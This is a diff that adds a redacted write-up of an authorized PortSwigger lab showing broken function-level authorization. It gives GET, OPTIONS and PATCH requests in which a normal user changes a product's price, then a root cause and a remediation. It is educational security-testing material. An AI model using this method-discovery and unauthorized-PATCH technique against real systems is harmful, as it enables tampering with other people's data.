@@ -1,0 +1,53 @@
+METHOD AND ENDPOINT COMPARISON
+
+Scope: Authorized PortSwigger educational lab
+
+Redaction:
+Host: REDACTED-LAB-HOST
+Cookie: session=REDACTED
+Password: REDACTED
+
+BASELINE REQUEST
+
+GET /api/products/REDACTED/price HTTP/2
+Host: REDACTED-LAB-HOST
+Cookie: session=REDACTED
+Accept: application/json
+
+Observed result:
+The endpoint returned the product price without changing server-side state.
+
+METHOD DISCOVERY
+
+OPTIONS /api/products/REDACTED/price HTTP/2
+Host: REDACTED-LAB-HOST
+Cookie: session=REDACTED
+
+Observed result:
+The response indicated that an additional state-changing method was supported.
+
+AUTHORIZATION TEST
+
+PATCH /api/products/REDACTED/price HTTP/2
+Host: REDACTED-LAB-HOST
+Cookie: session=REDACTED
+Content-Type: application/json
+
+{"price":"REDACTED-TEST-VALUE"}
+
+Observed result:
+The request was accepted under a normal-user session and changed server-side product data.
+
+SECURITY CONCLUSION
+
+Changed component:
+HTTP method, followed by the content type and required JSON property.
+
+Authorization result:
+A normal user could invoke a privileged product-management function.
+
+Root cause:
+An unused method remained deployed without function-level authorization.
+
+Remediation:
+Remove unused methods, apply a strict method allowlist, and require administrative authorization for product modifications.
